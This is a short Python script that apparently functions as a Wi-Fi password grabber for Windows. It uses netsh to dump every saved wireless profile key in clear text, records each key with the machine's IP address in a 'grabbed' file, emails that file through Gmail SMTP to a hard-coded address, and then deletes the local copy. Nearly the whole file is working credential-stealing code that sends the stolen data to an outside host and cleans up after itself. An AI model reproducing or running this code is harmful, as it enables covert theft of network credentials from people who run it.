import subprocess
import re
import smtplib
from datetime import date
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def send_mail(file_name):
    #enter your email and password here
    email_user = 'cc@gmail.com' 
    email_password = 'cc'
    email_send = 'cc@gmail.com'

    subject = 'subject'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    body = 'claimed!'
    msg.attach(MIMEText(body,'plain'))

    filename = file_name
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()



output = subprocess.check_output('ipconfig', shell=True)
if re.search("Wireless LAN adapter Wi-Fi:", str(output)):
    wifi = True
    ipv4_filter = re.search("(IPv4 Address.*\s)(.*)", str(output))
    ipv4 = ipv4_filter.group(2)
    ipv4_strip = ipv4.rstrip()

    
    command = 'netsh wlan show profiles'
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)",str(networks, encoding='utf-8'))
    for network_names in network_names_list:
        wifiname = network_names.strip()
        showpass_command = f'netsh wlan show profile {network_names} key=clear'
        showpass = subprocess.check_output(showpass_command, shell=True)
        password_list = re.search('(Key Content\s*:\s)(.*)', str(showpass, encoding='utf-8'))
        password = password_list.group(2)
        result = {
            'wifi name':wifiname,
            'wifi password':password.strip()
        }
        today = date.today()
        file_name = f'grabbed {today}.txt'
        with open(file_name, 'a') as writer:
            writer.write(f'wifi={wifi}     wifi_details={result}     from ip={ipv4_strip} \n')
    send_mail(file_name)
    os.remove(file_name)
    
else:
    quit()
